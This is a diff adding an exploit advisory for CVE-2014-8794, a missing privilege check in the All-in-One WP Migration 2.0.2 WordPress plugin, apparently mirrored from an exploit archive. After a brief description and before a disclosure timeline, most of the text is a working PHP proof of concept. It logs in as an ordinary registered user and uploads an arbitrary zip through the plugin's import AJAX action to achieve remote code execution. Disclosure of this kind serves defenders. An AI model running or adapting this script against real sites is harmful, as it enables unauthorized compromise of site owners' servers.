@@ -1,0 +1,72 @@
+id: 22927
+date: 11/26/2014
+title: All-in-One WP Migration 2.0.2 Remote Code Execution Vulnerability
+author: Kacper Szurek
+cves: CVE-2014-8794
+
+In Ai1wm_Import_Controller::import admin priveleges ARE NOT checked.
+
+Function is imported as action: add_action(‘wp_ajax_import’, ‘Ai1wm_Import_Controller::import’) in class-ai1wm-main-controller.php
+
+It’s possible to use it through wp-admin/admin-ajax.php as regular user.
+
+Using this functionality, we can send any kind of files to remote server.
+Proof of Concept:
+
+function hack($login, $pass, $url, $cookie ){
+
+    $ckfile = dirname(__FILE__) . $cookie;
+    $cookie = fopen($ckfile, 'w') or die("Cannot create cookie file");
+
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $url.'wp-login.php');
+	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
+	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_REFERER, $url.'wp-login.php');
+	curl_setopt($ch, CURLOPT_POSTFIELDS, "log=".$login."&pwd=".$pass."&wp-submit=Log%20In");
+	curl_setopt($ch, CURLOPT_POST, 1);
+	$content = curl_exec($ch);
+
+    if (preg_match('/adminmenu/i', $content)) {
+        echo 'We are log in.<br />';
+        curl_setopt($ch, CURLOPT_URL, $url.'wp-admin/admin-ajax.php');
+        curl_setopt($ch,
+            CURLOPT_POSTFIELDS,
+            array(
+                'upload-file' => '@' . realpath('poc.zip'),
+                'action' => 'import',
+                'force' => '1',
+                'name' => 'poc'
+            ));
+        $content = curl_exec($ch);
+
+        if (preg_match('/successfuly/i', $content)) {
+            echo 'Success';
+        } else {
+            echo 'Cannot exploit site';
+        }
+    } else {
+        echo "Cannot login to wordpress";
+    }
+
+	curl_close( $ch );
+}
+
+$url = "http://wordpress-url/";
+
+// Standard user credentials (created using wp-login.php?action=register)
+$user = "test";
+$pass = "test";
+$cookie = "/cookie.txt";
+
+hack($user, $pass, $url, $cookie);
+
+Timeline:
+
+    13-10-2014: Discovered
+    14-10-2014: Vendor notified
+    15-10-2014: Version 2.0.3 released, issue resolved
+
+#  0day.today [2023-03-27]  #
